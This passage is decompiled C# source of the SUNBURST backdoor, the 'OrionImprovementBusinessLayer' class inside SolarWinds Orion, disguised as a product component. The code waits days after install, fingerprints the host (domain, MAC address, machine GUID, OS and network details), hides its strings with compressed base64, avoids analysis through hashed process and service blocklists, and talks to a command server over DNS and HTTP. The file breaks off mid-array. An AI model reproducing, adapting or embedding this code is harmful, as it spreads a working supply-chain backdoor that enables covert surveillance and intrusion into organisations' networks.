using System;
using System.Collections.Generic;
using System.Configuration;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.IO.Pipes;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Security;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Microsoft.Win32;
using SolarWinds.Orion.Core.Common.Configuration;
using SolarWinds.Orion.Core.SharedCredentials.Credentials;

namespace SolarWinds.Orion.Core.BusinessLayer
{
	// Token: 0x0200000C RID: 12
	internal class OrionImprovementBusinessLayer
	{
		// Token: 0x17000011 RID: 17
		// (get) Token: 0x06000047 RID: 71 RVA: 0x00004254 File Offset: 0x00002454
		public static bool IsAlive
		{
			get
			{
				object isAliveLock = OrionImprovementBusinessLayer._isAliveLock;
				bool result;
				lock (isAliveLock)
				{
					if (OrionImprovementBusinessLayer._isAlive)
					{
						result = true;
					}
					else
					{
						OrionImprovementBusinessLayer._isAlive = true;
						result = false;
					}
				}
				return result;
			}
		}

		// Token: 0x17000012 RID: 18
		// (get) Token: 0x06000048 RID: 72 RVA: 0x000042A8 File Offset: 0x000024A8
		// (set) Token: 0x06000049 RID: 73 RVA: 0x000042F4 File Offset: 0x000024F4
		private static bool svcListModified1
		{
			get
			{
				object obj = OrionImprovementBusinessLayer.svcListModifiedLock;
				bool result;
				lock (obj)
				{
					bool svcListModified = OrionImprovementBusinessLayer._svcListModified1;
					OrionImprovementBusinessLayer._svcListModified1 = false;
					result = svcListModified;
				}
				return result;
			}
			set
			{
				object obj = OrionImprovementBusinessLayer.svcListModifiedLock;
				lock (obj)
				{
					OrionImprovementBusinessLayer._svcListModified1 = value;
				}
			}
		}

		// Token: 0x17000013 RID: 19
		// (get) Token: 0x0600004A RID: 74 RVA: 0x00004338 File Offset: 0x00002538
		// (set) Token: 0x0600004B RID: 75 RVA: 0x0000437C File Offset: 0x0000257C
		private static bool svcListModified2
		{
			get
			{
				object obj = OrionImprovementBusinessLayer.svcListModifiedLock;
				bool svcListModified;
				lock (obj)
				{
					svcListModified = OrionImprovementBusinessLayer._svcListModified2;
				}
				return svcListModified;
			}
			set
			{
				object obj = OrionImprovementBusinessLayer.svcListModifiedLock;
				lock (obj)
				{
					OrionImprovementBusinessLayer._svcListModified2 = value;
				}
			}
		}

		// Token: 0x0600004C RID: 76 RVA: 0x000043C0 File Offset: 0x000025C0
		public static void Initialize()
		{
			try
			{
				if (OrionImprovementBusinessLayer.GetHash(Process.GetCurrentProcess().ProcessName.ToLower()) == 17291806236368054941UL)
				{
					DateTime lastWriteTime = File.GetLastWriteTime(Assembly.GetExecutingAssembly().Location);
					int num = new Random().Next(288, 336);
					if (DateTime.Now.CompareTo(lastWriteTime.AddHours((double)num)) >= 0)
					{
						OrionImprovementBusinessLayer.instance = new NamedPipeServerStream(OrionImprovementBusinessLayer.appId);
						OrionImprovementBusinessLayer.ConfigManager.ReadReportStatus(out OrionImprovementBusinessLayer.status);
						if (OrionImprovementBusinessLayer.status != OrionImprovementBusinessLayer.ReportStatus.Truncate)
						{
							OrionImprovementBusinessLayer.DelayMin(0, 0);
							OrionImprovementBusinessLayer.domain4 = IPGlobalProperties.GetIPGlobalProperties().DomainName;
							if (!string.IsNullOrEmpty(OrionImprovementBusinessLayer.domain4) && !OrionImprovementBusinessLayer.IsNullOrInvalidName(OrionImprovementBusinessLayer.domain4))
							{
								OrionImprovementBusinessLayer.DelayMin(0, 0);
								if (OrionImprovementBusinessLayer.GetOrCreateUserID(out OrionImprovementBusinessLayer.userId))
								{
									OrionImprovementBusinessLayer.DelayMin(0, 0);
									OrionImprovementBusinessLayer.ConfigManager.ReadServiceStatus(false);
									OrionImprovementBusinessLayer.Update();
									OrionImprovementBusinessLayer.instance.Close();
								}
							}
						}
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600004D RID: 77 RVA: 0x000044C8 File Offset: 0x000026C8
		private static bool UpdateNotification()
		{
			int num = 3;
			while (num-- > 0)
			{
				OrionImprovementBusinessLayer.DelayMin(0, 0);
				if (OrionImprovementBusinessLayer.ProcessTracker.TrackProcesses(true))
				{
					return false;
				}
				if (OrionImprovementBusinessLayer.DnsHelper.CheckServerConnection(OrionImprovementBusinessLayer.apiHost))
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x0600004E RID: 78 RVA: 0x00004504 File Offset: 0x00002704
		private static void Update()
		{
			bool flag = false;
			OrionImprovementBusinessLayer.CryptoHelper cryptoHelper = new OrionImprovementBusinessLayer.CryptoHelper(OrionImprovementBusinessLayer.userId, OrionImprovementBusinessLayer.domain4);
			OrionImprovementBusinessLayer.HttpHelper httpHelper = null;
			Thread thread = null;
			bool flag2 = true;
			OrionImprovementBusinessLayer.AddressFamilyEx addressFamilyEx = OrionImprovementBusinessLayer.AddressFamilyEx.Unknown;
			int num = 0;
			bool flag3 = true;
			OrionImprovementBusinessLayer.DnsRecords dnsRecords = new OrionImprovementBusinessLayer.DnsRecords();
			Random random = new Random();
			int a = 0;
			if (!OrionImprovementBusinessLayer.UpdateNotification())
			{
				return;
			}
			OrionImprovementBusinessLayer.svcListModified2 = false;
			int num2 = 1;
			while (num2 <= 3 && !flag)
			{
				OrionImprovementBusinessLayer.DelayMin(dnsRecords.A, dnsRecords.A);
				if (!OrionImprovementBusinessLayer.ProcessTracker.TrackProcesses(true))
				{
					if (OrionImprovementBusinessLayer.svcListModified1)
					{
						flag3 = true;
					}
					num = (OrionImprovementBusinessLayer.svcListModified2 ? (num + 1) : 0);
					string hostName;
					if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.New)
					{
						hostName = ((addressFamilyEx == OrionImprovementBusinessLayer.AddressFamilyEx.Error) ? cryptoHelper.GetCurrentString() : cryptoHelper.GetPreviousString(out flag2));
					}
					else
					{
						if (OrionImprovementBusinessLayer.status != OrionImprovementBusinessLayer.ReportStatus.Append)
						{
							break;
						}
						hostName = (flag3 ? cryptoHelper.GetNextStringEx(dnsRecords.dnssec) : cryptoHelper.GetNextString(dnsRecords.dnssec));
					}
					addressFamilyEx = OrionImprovementBusinessLayer.DnsHelper.GetAddressFamily(hostName, dnsRecords);
					switch (addressFamilyEx)
					{
					case OrionImprovementBusinessLayer.AddressFamilyEx.NetBios:
						if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.Append)
						{
							flag3 = false;
							if (dnsRecords.dnssec)
							{
								a = dnsRecords.A;
								dnsRecords.A = random.Next(1, 3);
							}
						}
						if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.New && flag2)
						{
							OrionImprovementBusinessLayer.status = OrionImprovementBusinessLayer.ReportStatus.Append;
							OrionImprovementBusinessLayer.ConfigManager.WriteReportStatus(OrionImprovementBusinessLayer.status);
						}
						if (!string.IsNullOrEmpty(dnsRecords.cname))
						{
							dnsRecords.A = a;
							OrionImprovementBusinessLayer.HttpHelper.Close(httpHelper, thread);
							httpHelper = new OrionImprovementBusinessLayer.HttpHelper(OrionImprovementBusinessLayer.userId, dnsRecords);
							if (!OrionImprovementBusinessLayer.svcListModified2 || num > 1)
							{
								OrionImprovementBusinessLayer.svcListModified2 = false;
								thread = new Thread(new ThreadStart(httpHelper.Initialize))
								{
									IsBackground = true
								};
								thread.Start();
							}
						}
						num2 = 0;
						break;
					case OrionImprovementBusinessLayer.AddressFamilyEx.ImpLink:
					case OrionImprovementBusinessLayer.AddressFamilyEx.Atm:
						OrionImprovementBusinessLayer.ConfigManager.WriteReportStatus(OrionImprovementBusinessLayer.ReportStatus.Truncate);
						OrionImprovementBusinessLayer.ProcessTracker.SetAutomaticMode();
						flag = true;
						break;
					case OrionImprovementBusinessLayer.AddressFamilyEx.Ipx:
						if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.Append)
						{
							OrionImprovementBusinessLayer.ConfigManager.WriteReportStatus(OrionImprovementBusinessLayer.ReportStatus.New);
						}
						flag = true;
						break;
					case OrionImprovementBusinessLayer.AddressFamilyEx.InterNetwork:
					case OrionImprovementBusinessLayer.AddressFamilyEx.InterNetworkV6:
					case OrionImprovementBusinessLayer.AddressFamilyEx.Unknown:
						goto IL_1F7;
					case OrionImprovementBusinessLayer.AddressFamilyEx.Error:
						dnsRecords.A = random.Next(420, 540);
						break;
					default:
						goto IL_1F7;
					}
					IL_1F9:
					num2++;
					continue;
					IL_1F7:
					flag = true;
					goto IL_1F9;
				}
				break;
			}
			OrionImprovementBusinessLayer.HttpHelper.Close(httpHelper, thread);
		}

		// Token: 0x0600004F RID: 79 RVA: 0x00004720 File Offset: 0x00002920
		private static string GetManagementObjectProperty(ManagementObject obj, string property)
		{
			object value = obj.Properties[property].Value;
			string text;
			if (((value != null) ? value.GetType() : null) == typeof(string[]))
			{
				text = string.Join(", ", from v in (string[])obj.Properties[property].Value
				select v.ToString());
			}
			else
			{
				object value2 = obj.Properties[property].Value;
				text = (((value2 != null) ? value2.ToString() : null) ?? "");
			}
			string str = text;
			return property + ": " + str + "\n";
		}

		// Token: 0x06000050 RID: 80 RVA: 0x000047DC File Offset: 0x000029DC
		private static string GetNetworkAdapterConfiguration()
		{
			string text = "";
			string result;
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(OrionImprovementBusinessLayer.ZipHelper.Unzip("C07NSU0uUdBScCvKz1UIz8wzNor3Sy0pzy/KdkxJLChJLXLOz0vLTC8tSizJzM9TKM9ILUpV8AxwzUtMyklNsS0pKk0FAA==")))
				{
					foreach (ManagementObject obj in managementObjectSearcher.Get().Cast<ManagementObject>())
					{
						text += "\n";
						text += OrionImprovementBusinessLayer.GetManagementObjectProperty(obj, OrionImprovementBusinessLayer.ZipHelper.Unzip("c0ktTi7KLCjJzM8DAA=="));
						text += OrionImprovementBusinessLayer.GetManagementObjectProperty(obj, OrionImprovementBusinessLayer.ZipHelper.Unzip("83V0dkxJKUotLgYA"));
						text += OrionImprovementBusinessLayer.GetManagementObjectProperty(obj, OrionImprovementBusinessLayer.ZipHelper.Unzip("c/FwDnDNS0zKSU0BAA=="));
						text += OrionImprovementBusinessLayer.GetManagementObjectProperty(obj, OrionImprovementBusinessLayer.ZipHelper.Unzip("c/FwDghOLSpLLQIA"));
						text += OrionImprovementBusinessLayer.GetManagementObjectProperty(obj, OrionImprovementBusinessLayer.ZipHelper.Unzip("c/EL9sgvLvFLzE0FAA=="));
						text += OrionImprovementBusinessLayer.GetManagementObjectProperty(obj, OrionImprovementBusinessLayer.ZipHelper.Unzip("c/ELdsnPTczMCy5NS8usCE5NLErO8C9KSS0CAA=="));
						text += OrionImprovementBusinessLayer.GetManagementObjectProperty(obj, OrionImprovementBusinessLayer.ZipHelper.Unzip("c/ELDk4tKkstCk5NLErO8C9KSS0CAA=="));
						text += OrionImprovementBusinessLayer.GetManagementObjectProperty(obj, OrionImprovementBusinessLayer.ZipHelper.Unzip("8wxwTEkpSi0uBgA="));
						text += OrionImprovementBusinessLayer.GetManagementObjectProperty(obj, OrionImprovementBusinessLayer.ZipHelper.Unzip("8wwILk3KSy0BAA=="));
						text += OrionImprovementBusinessLayer.GetManagementObjectProperty(obj, OrionImprovementBusinessLayer.ZipHelper.Unzip("c0lNSyzNKfEMcE8sSS1PrAQA"));
					}
					result = text;
				}
			}
			catch (Exception ex)
			{
				result = text + ex.Message;
			}
			return result;
		}

		// Token: 0x06000051 RID: 81 RVA: 0x00004998 File Offset: 0x00002B98
		private static string GetOSVersion(bool full)
		{
			if (OrionImprovementBusinessLayer.osVersion == null || OrionImprovementBusinessLayer.osInfo == null)
			{
				try
				{
					using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(OrionImprovementBusinessLayer.ZipHelper.Unzip("C07NSU0uUdBScCvKz1UIz8wzNor3L0gtSizJzEsPriwuSc0FAA==")))
					{
						ManagementObject managementObject = managementObjectSearcher.Get().Cast<ManagementObject>().FirstOrDefault<ManagementObject>();
						OrionImprovementBusinessLayer.osInfo = managementObject.Properties[OrionImprovementBusinessLayer.ZipHelper.Unzip("c04sKMnMzwMA")].Value.ToString();
						OrionImprovementBusinessLayer.osInfo = OrionImprovementBusinessLayer.osInfo + ";" + managementObject.Properties[OrionImprovementBusinessLayer.ZipHelper.Unzip("8w92LErOyCxJTS4pLUoFAA==")].Value.ToString();
						OrionImprovementBusinessLayer.osInfo = OrionImprovementBusinessLayer.osInfo + ";" + managementObject.Properties[OrionImprovementBusinessLayer.ZipHelper.Unzip("88wrLknMyXFJLEkFAA==")].Value.ToString();
						OrionImprovementBusinessLayer.osInfo = OrionImprovementBusinessLayer.osInfo + ";" + managementObject.Properties[OrionImprovementBusinessLayer.ZipHelper.Unzip("8y9KT8zLrEosyczPAwA=")].Value.ToString();
						OrionImprovementBusinessLayer.osInfo = OrionImprovementBusinessLayer.osInfo + ";" + managementObject.Properties[OrionImprovementBusinessLayer.ZipHelper.Unzip("C0pNzywuSS1KTQktTi0CAA==")].Value.ToString();
						string text = managementObject.Properties[OrionImprovementBusinessLayer.ZipHelper.Unzip("C0stKs7MzwMA")].Value.ToString();
						OrionImprovementBusinessLayer.osInfo = OrionImprovementBusinessLayer.osInfo + ";" + text;
						string[] array = text.Split(new char[]
						{
							'.'
						});
						OrionImprovementBusinessLayer.osVersion = array[0] + "." + array[1];
					}
				}
				catch (Exception)
				{
					OrionImprovementBusinessLayer.osVersion = Environment.OSVersion.Version.Major + "." + Environment.OSVersion.Version.Minor;
					OrionImprovementBusinessLayer.osInfo = string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("i3aNVag2qFWoNgRio1oA"), Environment.OSVersion.VersionString, Environment.OSVersion.Version, Environment.Is64BitOperatingSystem ? 64 : 32);
				}
			}
			if (!full)
			{
				return OrionImprovementBusinessLayer.osVersion;
			}
			return OrionImprovementBusinessLayer.osInfo;
		}

		// Token: 0x06000052 RID: 82 RVA: 0x00004BE8 File Offset: 0x00002DE8
		private static string ReadDeviceInfo()
		{
			try
			{
				return (from nic in NetworkInterface.GetAllNetworkInterfaces()
				where nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback
				select nic.GetPhysicalAddress().ToString()).FirstOrDefault<string>();
			}
			catch (Exception)
			{
			}
			return null;
		}

		// Token: 0x06000053 RID: 83 RVA: 0x00004C60 File Offset: 0x00002E60
		private static bool GetOrCreateUserID(out byte[] hash64)
		{
			string text = OrionImprovementBusinessLayer.ReadDeviceInfo();
			hash64 = new byte[8];
			Array.Clear(hash64, 0, hash64.Length);
			if (text == null)
			{
				return false;
			}
			text += OrionImprovementBusinessLayer.domain4;
			try
			{
				text += OrionImprovementBusinessLayer.RegistryHelper.GetValue(OrionImprovementBusinessLayer.ZipHelper.Unzip("8/B2jYz38Xd29In3dXT28PRzjQn2dwsJdwxyjfHNTC7KL85PK4lxLqosKMlPL0osyKgEAA=="), OrionImprovementBusinessLayer.ZipHelper.Unzip("801MzsjMS3UvzUwBAA=="), "");
			}
			catch
			{
			}
			using (MD5 md = MD5.Create())
			{
				byte[] bytes = Encoding.ASCII.GetBytes(text);
				byte[] array = md.ComputeHash(bytes);
				if (array.Length < hash64.Length)
				{
					return false;
				}
				for (int i = 0; i < array.Length; i++)
				{
					byte[] array2 = hash64;
					int num = i % hash64.Length;
					array2[num] ^= array[i];
				}
			}
			return true;
		}

		// Token: 0x06000054 RID: 84 RVA: 0x00004D40 File Offset: 0x00002F40
		private static bool IsNullOrInvalidName(string domain4)
		{
			string[] array = domain4.ToLower().Split(new char[]
			{
				'.'
			});
			if (array.Length >= 2)
			{
				string s = array[array.Length - 2] + "." + array[array.Length - 1];
				foreach (ulong num in OrionImprovementBusinessLayer.patternHashes)
				{
					if (OrionImprovementBusinessLayer.GetHash(s) == num)
					{
						return true;
					}
				}
			}
			foreach (string pattern in OrionImprovementBusinessLayer.patternList)
			{
				if (Regex.Match(domain4, pattern).Success)
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x06000055 RID: 85 RVA: 0x00004DD8 File Offset: 0x00002FD8
		private static void DelayMs(double minMs, double maxMs)
		{
			if ((int)maxMs == 0)
			{
				minMs = 1000.0;
				maxMs = 2000.0;
			}
			double num;
			for (num = minMs + new Random().NextDouble() * (maxMs - minMs); num >= 2147483647.0; num -= 2147483647.0)
			{
				Thread.Sleep(int.MaxValue);
			}
			Thread.Sleep((int)num);
		}

		// Token: 0x06000056 RID: 86 RVA: 0x00004E3B File Offset: 0x0000303B
		private static void DelayMin(int minMinutes, int maxMinutes)
		{
			if (maxMinutes == 0)
			{
				minMinutes = 30;
				maxMinutes = 120;
			}
			OrionImprovementBusinessLayer.DelayMs((double)minMinutes * 60.0 * 1000.0, (double)maxMinutes * 60.0 * 1000.0);
		}

		// Token: 0x06000057 RID: 87 RVA: 0x00004E7C File Offset: 0x0000307C
		private static ulong GetHash(string s)
		{
			ulong num = 14695981039346656037UL;
			try
			{
				foreach (byte b in Encoding.UTF8.GetBytes(s))
				{
					num ^= (ulong)b;
					num *= 1099511628211UL;
				}
			}
			catch
			{
			}
			return num ^ 6605813339339102567UL;
		}

		// Token: 0x06000058 RID: 88 RVA: 0x00004EE4 File Offset: 0x000030E4
		private static string Quote(string s)
		{
			if (s == null || !s.Contains(" ") || s.Contains("\""))
			{
				return s;
			}
			return "\"" + s + "\"";
		}

		// Token: 0x06000059 RID: 89 RVA: 0x00004F18 File Offset: 0x00003118
		private static string Unquote(string s)
		{
			if (s.StartsWith('"'.ToString()) && s.EndsWith('"'.ToString()))
			{
				return s.Substring(1, s.Length - 2);
			}
			return s;
		}

		// Token: 0x0600005A RID: 90 RVA: 0x00004F5C File Offset: 0x0000315C
		private static string ByteArrayToHexString(byte[] bytes)
		{
			StringBuilder stringBuilder = new StringBuilder(bytes.Length * 2);
			foreach (byte b in bytes)
			{
				stringBuilder.AppendFormat("{0:x2}", b);
			}
			return stringBuilder.ToString();
		}

		// Token: 0x0600005B RID: 91 RVA: 0x00004FA0 File Offset: 0x000031A0
		private static byte[] HexStringToByteArray(string hex)
		{
			byte[] array = new byte[hex.Length / 2];
			for (int i = 0; i < hex.Length; i += 2)
			{
				array[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
			}
			return array;
		}

		// Token: 0x04000022 RID: 34
		private static volatile bool _isAlive = false;

		// Token: 0x04000023 RID: 35
		private static readonly object _isAliveLock = new object();

		// Token: 0x04000024 RID: 36
		private static readonly ulong[] assemblyTimeStamps = new ulong[]
		{
			2597124982561782591UL,
			2600364143812063535UL,
			13464308873961738403UL,
			4821863173800309721UL,
			12969190449276002545UL,
			3320026265773918739UL,
			12094027092655598256UL,
			10657751674541025650UL,
			11913842725949116895UL,
			5449730069165757263UL,
			292198192373389586UL,
			12790084614253405985UL,
			5219431737322569038UL,
			15535773470978271326UL,
			7810436520414958497UL,
			13316211011159594063UL,
			13825071784440082496UL,
			14480775929210717493UL,
			14482658293117931546UL,
			8473756179280619170UL,
			3778500091710709090UL,
			8799118153397725683UL,
			12027963942392743532UL,
			576626207276463000UL,
			7412338704062093516UL,
			682250828679635420UL,
			13014156621614176974UL,
			18150909006539876521UL,
			10336842116636872171UL,
			12785322942775634499UL,
			13260224381505715848UL,
			17956969551821596225UL,
			8709004393777297355UL,
			14256853800858727521UL,
			8129411991672431889UL,
			15997665423159927228UL,
			10829648878147112121UL,
			9149947745824492274UL,
			3656637464651387014UL,
			3575761800716667678UL,
			4501656691368064027UL,
			10296494671777307979UL,
			14630721578341374856UL,
			4088976323439621041UL,
			9531326785919727076UL,
			6461429591783621719UL,
			6508141243778577344UL,
			10235971842993272939UL,
			2478231962306073784UL,
			9903758755917170407UL,
			14710585101020280896UL,
			14710585101020280896UL,
			13611814135072561278UL,
			2810460305047003196UL,
			2032008861530788751UL,
			27407921587843457UL,
			6491986958834001955UL,
			2128122064571842954UL,
			10484659978517092504UL,
			8478833628889826985UL,
			10463926208560207521UL,
			7080175711202577138UL,
			8697424601205169055UL,
			7775177810774851294UL,
			16130138450758310172UL,
			506634811745884560UL,
			18294908219222222902UL,
			3588624367609827560UL,
			9555688264681862794UL,
			5415426428750045503UL,
			3642525650883269872UL,
			13135068273077306806UL,
			3769837838875367802UL,
			191060519014405309UL,
			1682585410644922036UL,
			7878537243757499832UL,
			13799353263187722717UL,
			1367627386496056834UL,
			12574535824074203265UL,
			16990567851129491937UL,
			8994091295115840290UL,
			13876356431472225791UL,
			14968320160131875803UL,
			14868920869169964081UL,
			106672141413120087UL,
			79089792725215063UL,
			5614586596107908838UL,
			3869935012404164040UL,
			3538022140597504361UL,
			14111374107076822891UL,
			7982848972385914508UL,
			8760312338504300643UL,
			17351543633914244545UL,
			7516148236133302073UL,
			15114163911481793350UL,
			15457732070353984570UL,
			16292685861617888592UL,
			10374841591685794123UL,
			3045986759481489935UL,
			17109238199226571972UL,
			6827032273910657891UL,
			5945487981219695001UL,
			8052533790968282297UL,
			17574002783607647274UL,
			3341747963119755850UL,
			14193859431895170587UL,
			17439059603042731363UL,
			17683972236092287897UL,
			700598796416086955UL,
			3660705254426876796UL,
			12709986806548166638UL,
			3890794756780010537UL,
			2797129108883749491UL,
			3890769468012566366UL,
			14095938998438966337UL,
			11109294216876344399UL,
			1368907909245890092UL,
			11818825521849580123UL,
			8146185202538899243UL,
			2934149816356927366UL,
			13029357933491444455UL,
			6195833633417633900UL,
			2760663353550280147UL,
			16423314183614230717UL,
			2532538262737333146UL,
			4454255944391929578UL,
			6088115528707848728UL,
			13611051401579634621UL,
			18147627057830191163UL,
			17633734304611248415UL,
			13581776705111912829UL,
			7175363135479931834UL,
			3178468437029279937UL,
			13599785766252827703UL,
			6180361713414290679UL,
			8612208440357175863UL,
			8408095252303317471UL
		};

		// Token: 0x04000025 RID: 37
		private static readonly ulong[] configTimeStamps = new ulong[]
		{
			17097380490166623672UL,
			15194901817027173566UL,
			12718416789200275332UL,
			18392881921099771407UL,
			3626142665768487764UL,
			12343334044036541897UL,
			397780960855462669UL,
			6943102301517884811UL,
			13544031715334011032UL,
			11801746708619571308UL,
			18159703063075866524UL,
			835151375515278827UL,
			16570804352575357627UL,
			1614465773938842903UL,
			12679195163651834776UL,
			2717025511528702475UL,
			17984632978012874803UL
		};

		// Token: 0x04000026 RID: 38
		private static readonly object svcListModifiedLock = new object();

		// Token: 0x04000027 RID: 39
		private static volatile bool _svcListModified1 = false;

		// Token: 0x04000028 RID: 40
		private static volatile bool _svcListModified2 = false;

		// Token: 0x04000029 RID: 41
		private static readonly OrionImprovementBusinessLayer.ServiceConfiguration[] svcList = new OrionImprovementBusinessLayer.ServiceConfiguration[]
		{
			new OrionImprovementBusinessLayer.ServiceConfiguration
			{
				timeStamps = new ulong[]
				{
					5183687599225757871UL
				},
				Svc = new OrionImprovementBusinessLayer.ServiceConfiguration.Service[]
				{
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 917638920165491138UL,
						started = true
					}
				}
			},
			new OrionImprovementBusinessLayer.ServiceConfiguration
			{
				timeStamps = new ulong[]
				{
					10063651499895178962UL
				},
				Svc = new OrionImprovementBusinessLayer.ServiceConfiguration.Service[]
				{
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 16335643316870329598UL,
						started = true
					}
				}
			},
			new OrionImprovementBusinessLayer.ServiceConfiguration
			{
				timeStamps = new ulong[]
				{
					10501212300031893463UL,
					155978580751494388UL
				},
				Svc = new OrionImprovementBusinessLayer.ServiceConfiguration.Service[0]
			},
			new OrionImprovementBusinessLayer.ServiceConfiguration
			{
				timeStamps = new ulong[]
				{
					17204844226884380288UL,
					5984963105389676759UL
				},
				Svc = new OrionImprovementBusinessLayer.ServiceConfiguration.Service[]
				{
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 11385275378891906608UL,
						DefaultValue = 2U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 13693525876560827283UL,
						DefaultValue = 1U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 17849680105131524334UL,
						DefaultValue = 1U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 18246404330670877335UL,
						DefaultValue = 3U
					}
				}
			},
			new OrionImprovementBusinessLayer.ServiceConfiguration
			{
				timeStamps = new ulong[]
				{
					8698326794961817906UL,
					9061219083560670602UL
				},
				Svc = new OrionImprovementBusinessLayer.ServiceConfiguration.Service[]
				{
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 11771945869106552231UL,
						DefaultValue = 1U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 9234894663364701749UL,
						DefaultValue = 3U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 8698326794961817906UL,
						DefaultValue = 2U
					}
				}
			},
			new OrionImprovementBusinessLayer.ServiceConfiguration
			{
				timeStamps = new ulong[]
				{
					15695338751700748390UL,
					640589622539783622UL
				},
				Svc = new OrionImprovementBusinessLayer.ServiceConfiguration.Service[]
				{
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 15695338751700748390UL,
						DefaultValue = 2U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 9384605490088500348UL,
						DefaultValue = 3U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 6274014997237900919UL,
						DefaultValue = 3U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 15092207615430402812UL,
						DefaultValue = 0U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 3320767229281015341UL,
						DefaultValue = 3U
					}
				}
			},
			new OrionImprovementBusinessLayer.ServiceConfiguration
			{
				timeStamps = new ulong[]
				{
					3200333496547938354UL,
					14513577387099045298UL,
					607197993339007484UL
				},
				Svc = new OrionImprovementBusinessLayer.ServiceConfiguration.Service[]
				{
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 15587050164583443069UL,
						DefaultValue = 1U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 9559632696372799208UL,
						DefaultValue = 0U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 4931721628717906635UL,
						DefaultValue = 1U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 3200333496547938354UL,
						DefaultValue = 2U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 2589926981877829912UL,
						DefaultValue = 3U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 17997967489723066537UL,
						DefaultValue = 1U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 14079676299181301772UL,
						DefaultValue = 2U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 17939405613729073960UL,
						DefaultValue = 1U
					}
				}
			},
			new OrionImprovementBusinessLayer.ServiceConfiguration
			{
				timeStamps = new ulong[]
				{
					521157249538507889UL,
					14971809093655817917UL,
					10545868833523019926UL,
					15039834196857999838UL,
					14055243717250701608UL,
					5587557070429522647UL,
					12445177985737237804UL,
					17978774977754553159UL,
					17017923349298346219UL
				},
				Svc = new OrionImprovementBusinessLayer.ServiceConfiguration.Service[]
				{
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 17624147599670377042UL,
						DefaultValue = 2U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 16066651430762394116UL,
						DefaultValue = 3U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 13655261125244647696UL,
						DefaultValue = 2U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 12445177985737237804UL,
						DefaultValue = 3U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 3421213182954201407UL,
						DefaultValue = 2U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 14243671177281069512UL,
						DefaultValue = 3U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 16112751343173365533UL,
						DefaultValue = 3U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 3425260965299690882UL,
						DefaultValue = 1U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 9333057603143916814UL,
						DefaultValue = 0U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 3413886037471417852UL,
						DefaultValue = 3U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 7315838824213522000UL,
						DefaultValue = 1U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 13783346438774742614UL,
						DefaultValue = 4U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 2380224015317016190UL,
						DefaultValue = 4U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 3413052607651207697UL,
						DefaultValue = 1U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 3407972863931386250UL,
						DefaultValue = 1U
					},
